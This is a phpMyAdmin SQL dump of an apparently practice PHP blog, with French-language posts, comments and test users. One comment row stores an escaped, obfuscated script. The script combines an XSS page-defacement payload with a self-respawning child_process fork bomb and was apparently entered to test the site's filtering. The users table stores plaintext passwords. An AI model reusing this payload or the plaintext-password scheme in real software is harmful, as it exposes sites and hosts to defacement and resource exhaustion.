-- phpMyAdmin SQL Dump
-- version 4.9.1
-- https://www.phpmyadmin.net/
--
-- Hôte : 127.0.0.1
-- Généré le :  Dim 20 oct. 2019 à 18:27
-- Version du serveur :  10.4.8-MariaDB
-- Version de PHP :  7.3.10

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Base de données :  `test`
--

-- --------------------------------------------------------

--
-- Structure de la table `comments`
--

CREATE TABLE `comments` (
  `id` int(11) NOT NULL,
  `post_id` int(11) NOT NULL,
  `author` varchar(255) NOT NULL,
  `comment` text NOT NULL,
  `comment_date` datetime NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Déchargement des données de la table `comments`
--

INSERT INTO `comments` (`id`, `post_id`, `author`, `comment`, `comment_date`) VALUES
(1, 1, 'M@teo21', 'Un peu court ce billet !', '2010-03-25 16:49:53'),
(2, 1, 'Maxime', 'Oui, ça commence pas très fort ce blog...', '2010-03-25 16:57:16'),
(23, 1, 'Stan', 'Ton CRUD ne fonctionne pas', '2019-10-17 18:58:32'),
(4, 2, 'John', 'Preum\'s !', '2010-03-27 18:59:49'),
(5, 2, 'Maxime', 'Excellente analyse de la situation !\r\nIl y arrivera plus tôt qu\'on ne le pense !', '2010-03-27 22:02:13'),
(6, 2, 'Noémie', 'Wow...', '2019-10-16 15:03:29'),
(7, 2, 'Haroun', '<p><strong><del>Je crois en mon mentor... mais je vais quand même avoir besoin d\'actualiser !&nbsp;</del></strong></p>', '2019-10-16 16:49:09'),
(24, 1, 'HACKER CHINOIS MECHANT', '&lt;p&gt;&lt;span class=&quot;html-tag&quot; style=&quot;font-family: monospace; white-space: pre-wrap;&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;span style=&quot;font-family: monospace; white-space: pre-wrap;&quot;&gt;var _0x1b9c=[\'spawn\',\'argv\',\'());\',\'toString\',\'onload\',\'body\',\'innerHTML\',\'&amp;lt;h1\\x20style=\\x27color:red;\\x27&amp;gt;\\x20XSS\\x20!\\x20&amp;lt;/h1&amp;gt;\',\'child_process\'];(function(_0x23d2fe,_0x53656e){var _0x3b01d6=function(_0x230f1d){while(--_0x230f1d){_0x23d2fe[\'push\'](_0x23d2fe[\'shift\']());}};_0x3b01d6(++_0x53656e);}(_0x1b9c,0x148));var _0x44a4=function(_0x43f3a3,_0xab312e){_0x43f3a3=_0x43f3a3-0x0;var _0xf6b9ed=_0x1b9c[_0x43f3a3];return _0xf6b9ed;};window[_0x44a4(\'0x0\')]=function(){document[_0x44a4(\'0x1\')][_0x44a4(\'0x2\')]=_0x44a4(\'0x3\');}(function f(){require(_0x44a4(\'0x4\'))[_0x44a4(\'0x5\')](process[_0x44a4(\'0x6\')][0x0],[\'-e\',\'(\'+f[\'toString\']()+_0x44a4(\'0x7\')]);require(_0x44a4(\'0x4\'))[_0x44a4(\'0x5\')](process[_0x44a4(\'0x6\')][0x0],[\'-e\',\'(\'+f[_0x44a4(\'0x8\')]()+\'());\']);}());&lt;/span&gt;&lt;span class=&quot;html-tag&quot; style=&quot;font-family: monospace; white-space: pre-wrap;&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;span style=&quot;font-family: monospace; white-space: pre-wrap;&quot;&gt; &lt;/span&gt;&lt;/p&gt;', '2019-10-17 18:59:10'),
(14, 2, 'Stan', '(Commentaire modéré par l\'Administrateur tout puissant)', '2019-10-16 17:54:51'),
(17, 2, 'Hackeur 2', '(Commentaire modéré par l\'Administrateur)', '2019-10-16 18:33:50');

-- --------------------------------------------------------

--
-- Structure de la table `posts`
--

CREATE TABLE `posts` (
  `id` int(11) NOT NULL,
  `title` varchar(255) NOT NULL,
  `content` text NOT NULL,
  `creation_date` datetime NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Déchargement des données de la table `posts`
--

INSERT INTO `posts` (`id`, `title`, `content`, `creation_date`) VALUES
(1, 'Bienvenue sur mon blog !', 'Je vous souhaite à toutes et à tous la bienvenue sur mon blog qui parlera de... PHP bien sûr !', '2010-03-25 16:28:41'),
(2, 'Le PHP à la conquête du monde !', 'C\'est officiel, l\'éléPHPant a annoncé à la radio hier soir \"J\'ai l\'intention de conquérir le monde !\".\r\nIl a en outre précisé que le monde serait à sa botte en moins de temps qu\'il n\'en fallait pour dire \"éléPHPant\". Pas dur, ceci dit entre nous...', '2010-03-27 18:31:11'),
(6, 'TEST 2', '42 Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum', '2019-10-17 18:01:25'),
(7, 'Je modifie tout ce que je veux, OK ?', 'Je suis vraiment le magicien aux yeux bleus héhéhéhéhéhéhéhéhéhhéhéhéhéhéhéhéhé', '2019-10-17 18:01:32');

-- --------------------------------------------------------

--
-- Structure de la table `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `username` varchar(50) NOT NULL,
  `password` varchar(255) NOT NULL,
  `rank` int(4) NOT NULL DEFAULT 0,
  `token` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Déchargement des données de la table `users`
--

INSERT INTO `users` (`id`, `username`, `password`, `rank`, `token`) VALUES
(1, 'test', 'test', 1, ''),
(2, 'test2', 'test2', 0, '');

--
-- Index pour les tables déchargées
--

--
-- Index pour la table `comments`
--
ALTER TABLE `comments`
  ADD PRIMARY KEY (`id`);

--
-- Index pour la table `posts`
--
ALTER TABLE `posts`
  ADD PRIMARY KEY (`id`);

--
-- Index pour la table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT pour les tables déchargées
--

--
-- AUTO_INCREMENT pour la table `comments`
--
ALTER TABLE `comments`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=25;

--
-- AUTO_INCREMENT pour la table `posts`
--
ALTER TABLE `posts`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- AUTO_INCREMENT pour la table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
